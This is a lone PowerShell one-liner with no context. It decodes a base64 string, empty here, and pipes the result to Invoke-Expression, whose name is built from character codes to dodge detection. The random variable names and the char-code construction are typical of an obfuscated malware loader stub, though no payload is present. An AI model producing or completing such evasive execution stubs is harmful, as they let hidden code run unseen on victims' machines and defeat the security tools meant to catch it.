$MAQ="";$WHVPXTK=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($MAQ));$WHVPXTK|&([char]73+[char]69+[char]120)